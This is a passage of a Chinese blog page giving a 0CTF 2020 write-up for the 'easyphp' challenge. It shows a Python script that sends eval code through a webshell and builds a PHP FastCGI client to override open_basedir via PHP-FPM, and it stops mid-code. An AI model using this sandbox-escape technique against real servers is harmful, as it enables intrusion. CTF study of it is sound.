@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/favicon.ico" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"rmb122.com","root":"/","scheme":"Mist","version":"8.0.0-rc.2","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":"flat"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="又是一年 0CTF, 这次一个人一队单刷一次, 做出了两题 WEB, 可惜只输出了一天, 第二天还要赶 ddl, 还是太蔡了 orz">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TCTF&#x2F;0CTF 2020 Writeup">
+<meta property="og:url" content="https://rmb122.com/2020/06/29/TCTF-0CTF-2020-Writeup/index.html">
+<meta property="og:site_name" content="Rmb122&#39;s Notebook">
+<meta property="og:description" content="又是一年 0CTF, 这次一个人一队单刷一次, 做出了两题 WEB, 可惜只输出了一天, 第二天还要赶 ddl, 还是太蔡了 orz">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2020/06/29/Gde8ry9uX3TKjR7.png">
+<meta property="article:published_time" content="2020-06-29T11:49:05.000Z">
+<meta property="article:modified_time" content="2020-07-02T08:07:47.301Z">
+<meta property="article:author" content="rmb122">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="0ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/06/29/Gde8ry9uX3TKjR7.png">
+
+<link rel="canonical" href="https://rmb122.com/2020/06/29/TCTF-0CTF-2020-Writeup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>TCTF/0CTF 2020 Writeup | Rmb122's Notebook</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Rmb122's Notebook" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+        <span class="toggle-line toggle-line-first"></span>
+        <span class="toggle-line toggle-line-middle"></span>
+        <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Rmb122's Notebook</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://rmb122.com/2020/06/29/TCTF-0CTF-2020-Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="rmb122">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Rmb122's Notebook">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          TCTF/0CTF 2020 Writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-06-29 19:49:05" itemprop="dateCreated datePublished" datetime="2020-06-29T19:49:05+08:00">2020-06-29</time>
+            </span>
+
+          
+            <span id="/2020/06/29/TCTF-0CTF-2020-Writeup/" class="post-meta-item leancloud_visitors" data-flag-title="TCTF/0CTF 2020 Writeup" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/06/29/TCTF-0CTF-2020-Writeup/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/06/29/TCTF-0CTF-2020-Writeup/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>又是一年 0CTF, 这次一个人一队单刷一次, 做出了两题 WEB, 可惜只输出了一天, 第二天还要赶 ddl, 还是太蔡了 orz</p>
+<a id="more"></a>
+
+<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>直接给了 webshell, 看 phpinfo,  </p>
+<p>disable_functions:<br>set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl<br>open_basedir: /var/www/html<br>disable_classes: ReflectionClass<br>Server API:    FPM/FastCGI  </p>
+<p>看样子是需要 rce, 有 disable_functions 和 open_basedir 的限制, 这里可以看到用的是 fpm 而且 fsockopen 没有限制, 可以想到直接打 fcgi, 不过需要知道 unix socket 的路径, 这里可以用 DirectoryIterator 来列目录, 不过试了下只能列根目录, 其他地方还是会被 open_basedir 拦, 比较神奇. 不过好在 fuzz 了一下, 是个常见未知, 在 <code>unix:///var/run/php-fpm.sock</code>.<br>之后就不用多说了, 用 PHP_VALUE 里面的 open_basedir 覆盖掉 php.ini 里的 open_basedir 即可.  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">sess = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_php_code</span><span class="params">(s)</span>:</span></span><br><span class="line">    res = sess.post(<span class="string">'http://pwnable.org:19260/?rh=eval($_POST[a]);'</span>, data=&#123;<span class="string">"a"</span>: s&#125;)</span><br><span class="line">    <span class="keyword">return</span> res.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code = <span class="string">'''</span></span><br><span class="line"><span class="string">class AA</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    const VERSION_1            = 1;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    const BEGIN_REQUEST        = 1;</span></span><br><span class="line"><span class="string">    const ABORT_REQUEST        = 2;</span></span><br><span class="line"><span class="string">    const END_REQUEST          = 3;</span></span><br><span class="line"><span class="string">    const PARAMS               = 4;</span></span><br><span class="line"><span class="string">    const STDIN                = 5;</span></span><br><span class="line"><span class="string">    const STDOUT               = 6;</span></span><br><span class="line"><span class="string">    const STDERR               = 7;</span></span><br><span class="line"><span class="string">    const DATA                 = 8;</span></span><br><span class="line"><span class="string">    const GET_VALUES           = 9;</span></span><br><span class="line"><span class="string">    const GET_VALUES_RESULT    = 10;</span></span><br><span class="line"><span class="string">    const UNKNOWN_TYPE         = 11;</span></span><br><span class="line"><span class="string">    const MAXTYPE              = self::UNKNOWN_TYPE;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    const RESPONDER            = 1;</span></span><br><span class="line"><span class="string">    const AUTHORIZER           = 2;</span></span><br><span class="line"><span class="string">    const FILTER               = 3;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    const REQUEST_COMPLETE     = 0;</span></span><br><span class="line"><span class="string">    const CANT_MPX_CONN        = 1;</span></span><br><span class="line"><span class="string">    const OVERLOADED           = 2;</span></span><br><span class="line"><span class="string">    const UNKNOWN_ROLE         = 3;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    const MAX_CONNS            = 'MAX_CONNS';</span></span><br><span class="line"><span class="string">    const MAX_REQS             = 'MAX_REQS';</span></span><br><span class="line"><span class="string">    const MPXS_CONNS           = 'MPXS_CONNS';</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    const HEADER_LEN           = 8;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Socket</span></span><br><span class="line"><span class="string">     * @var Resource</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private $_sock = null;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Host</span></span><br><span class="line"><span class="string">     * @var String</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private $_host = null;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Port</span></span><br><span class="line"><span class="string">     * @var Integer</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private $_port = null;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Keep Alive</span></span><br><span class="line"><span class="string">     * @var Boolean</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private $_keepAlive = false;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Constructor</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @param String $host Host of the FastCGI application</span></span><br><span class="line"><span class="string">     * @param Integer $port Port of the FastCGI application</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        $this-&gt;_host = $host;</span></span><br><span class="line"><span class="string">        $this-&gt;_port = $port;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Define whether or not the FastCGI application should keep the connection</span></span><br><span class="line"><span class="string">     * alive at the end of a request</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @param Boolean $b true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    public function setKeepAlive($b)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        $this-&gt;_keepAlive = (boolean)$b;</span></span><br><span class="line"><span class="string">        if (!$this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock) &#123;</span></span><br><span class="line"><span class="string">            fclose($this-&gt;_sock);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Get the keep alive status</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @return Boolean true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    public function getKeepAlive()</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        return $this-&gt;_keepAlive;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Create a connection to the FastCGI application</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private function connect()</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        if (!$this-&gt;_sock) &#123;</span></span><br><span class="line"><span class="string">            $this-&gt;_sock = fsockopen($this-&gt;_host);</span></span><br><span class="line"><span class="string">            var_dump($this-&gt;_sock);</span></span><br><span class="line"><span class="string">            if (!$this-&gt;_sock) &#123;</span></span><br><span class="line"><span class="string">                throw new Exception('Unable to connect to FastCGI application');</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Build a FastCGI packet</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @param Integer $type Type of the packet</span></span><br><span class="line"><span class="string">     * @param String $content Content of the packet</span></span><br><span class="line"><span class="string">     * @param Integer $requestId RequestId</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private function buildPacket($type, $content, $requestId = 1)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        $clen = strlen($content);</span></span><br><span class="line"><span class="string">        return chr(self::VERSION_1)         /* version */</span></span><br><span class="line"><span class="string">            . chr($type)                    /* type */</span></span><br><span class="line"><span class="string">            . chr(($requestId &gt;&gt; 8) &amp; 0xFF) /* requestIdB1 */</span></span><br><span class="line"><span class="string">            . chr($requestId &amp; 0xFF)        /* requestIdB0 */</span></span><br><span class="line"><span class="string">            . chr(($clen &gt;&gt; 8 ) &amp; 0xFF)     /* contentLengthB1 */</span></span><br><span class="line"><span class="string">            . chr($clen &amp; 0xFF)             /* contentLengthB0 */</span></span><br><span class="line"><span class="string">            . chr(0)                        /* paddingLength */</span></span><br><span class="line"><span class="string">            . chr(0)                        /* reserved */</span></span><br><span class="line"><span class="string">            . $content;                     /* content */</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Build an FastCGI Name value pair</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @param String $name Name</span></span><br><span class="line"><span class="string">     * @param String $value Value</span></span><br><span class="line"><span class="string">     * @return String FastCGI Name value pair</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private function buildNvpair($name, $value)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        $nlen = strlen($name);</span></span><br><span class="line"><span class="string">        $vlen = strlen($value);</span></span><br><span class="line"><span class="string">        if ($nlen &lt; 128) &#123;</span></span><br><span class="line"><span class="string">            /* nameLengthB0 */</span></span><br><span class="line"><span class="string">            $nvpair = chr($nlen);</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span></span><br><span class="line"><span class="string">            $nvpair = chr(($nlen &gt;&gt; 24) | 0x80) . chr(($nlen &gt;&gt; 16) &amp; 0xFF) . chr(($nlen &gt;&gt; 8) &amp; 0xFF) . chr($nlen &amp; 0xFF);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        if ($vlen &lt; 128) &#123;</span></span><br><span class="line"><span class="string">            /* valueLengthB0 */</span></span><br><span class="line"><span class="string">            $nvpair .= chr($vlen);</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span></span><br><span class="line"><span class="string">            $nvpair .= chr(($vlen &gt;&gt; 24) | 0x80) . chr(($vlen &gt;&gt; 16) &amp; 0xFF) . chr(($vlen &gt;&gt; 8) &amp; 0xFF) . chr($vlen &amp; 0xFF);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        /* nameData &amp; valueData */</span></span><br><span class="line"><span class="string">        return $nvpair . $name . $value;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /**</span></span><br><span class="line"><span class="string">     * Read a set of FastCGI Name value pairs</span></span><br><span class="line"><span class="string">     *</span></span><br><span class="line"><span class="string">     * @param String $data Data containing the set of FastCGI NVPair</span></span><br><span class="line"><span class="string">     * @return array of NVPair</span></span><br><span class="line"><span class="string">     */</span></span><br><span class="line"><span class="string">    private function readNvpair($data, $length = null)</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        $array = array();</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        if ($length === null) &#123;</span></span><br><span class="line"><span class="string">            $length = strlen($data);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        $p = 0;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        while ($p != $length) &#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            $nlen = ord($data&#123;$p++&#125;);</span></span><br><span class="line"><span class="string">            if ($nlen &gt;= 128) &#123;</span></span><br><span class="line"><span class="string">                $nlen = ($nlen &amp; 0x7F &lt;&lt; 24);</span></span><br><span class="line"><span class="string">                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 16);</span></span><br><span class="line"><span class="string">                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; 8);</span></span><br><span class="line"><span class="string">                $nlen |= (ord($data&#123;$p++&#125;));</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            $vlen = ord($data&#123;$p++&#125;);</span></span><br><span class="line"><span class="string">            if ($vlen &gt;= 128) &#123;</span></span><br><span class="line"><span class="string">                $vlen = ($nlen &amp; 0x7F &lt;&lt; 